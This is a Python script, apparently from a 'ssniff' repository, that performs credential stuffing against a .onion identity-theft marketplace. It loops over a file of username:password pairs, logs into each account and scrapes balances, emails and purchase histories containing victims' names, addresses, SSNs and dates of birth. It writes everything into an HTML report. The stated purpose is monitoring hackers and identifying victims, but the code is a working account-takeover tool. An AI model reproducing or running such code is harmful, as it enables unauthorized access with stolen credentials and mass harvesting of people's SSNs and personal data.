site = '.onion'
print('''<!DOCTYPE html>
<html>
<head>
<style>
table {
  font-size:16px;
  width:800px;
}
th#n, td#n {
  text-align: center;
  width:20px;
}
table#t {
  font-size:12px;
}
table, th, td {
  border: 1px solid black;
  border-collapse: collapse;
}
th, td {
  padding: 5px;
  text-align: left;
}
</style>
</head>
<body>
<h3>Credential stuffing identity theft marketplaces to monitor hacker's activity and identify victims.</h3>
<p>script source https://github.com/rip/ssniff (s.py, quick and dirty code)</p>
<br><br><br>''')
from requests_html import HTMLSession
total=0
with open("") as f:
   l = f.readline()
   while l:
       l = f.readline().strip()
       # changing to u:p 
       up = l.split(':')
       # no eof or list out of range errors
       if len(up) == 2:
        login, password = up
        #
        with HTMLSession() as s:
          # send login request
          x = s.post(f'http://{site}/login', data={'login': login, 'password': password}, timeout=15, headers={'User-Agent': ''})
          # balance // successful login
          try:
            bal = '$' + x.text.split('($')[1].split(')')[0]
          except: 
            bal = 'FAIL'
            pass
          if bal != 'FAIL':
            y = s.get(f'http://{site}/settings', timeout=15, headers={'User-Agent': ''}).text
            try:
              email = y.split('m_mail" type="text" value="')[1].split('"/>')[0]
            except:
              email = ''
            try:
              h = s.get(f'http://{site}/history', timeout=15, headers={'User-Agent': ''}).text.split('<tbody>')[1].split('</tbody>')[0]
              i = len(h.split('<tr>')) - 1;total+=i
              if 'Next 50 records' in h:
                print('Next 50 records!')
            except:
              h = ''
              i = 0
            try:
              h2 = s.get(f'http://{site}/used/history', timeout=15, headers={'User-Agent': ''}).text.split('<tbody>')[1].split('</tbody>')[0]
              if 'Next 50 records' in h2:
                print('Next 50 records!') #
            except:
              h2 = ''
            t = f'''<table>
  <caption>{site}</caption>
    
  <tr>
    <th id="n"># of SSN(s)</th>
    <th>Balance</th>
    <th>Username</th>
    <th>Password</th>
    <th>E-mail</th>
  </tr>

  <tr>
    <td id="n">{i}</td>
    <td>{bal}</td>
    <td>{login}</td>
    <td>{password}</td>
    <td>{email}</td>
  </tr>

</table>
<br>

<table id="t">
  <tr>
    <th id="n">#</th>
    <th>Name</th>
    <th>Address</th>
    <th>SSN</th>
    <th>DOB</th>
    <th>Date</th>
  </tr>
  
  {h} {h2}

  </table>
  
  <br><br>'''
            print(t)
print('Total:',total)
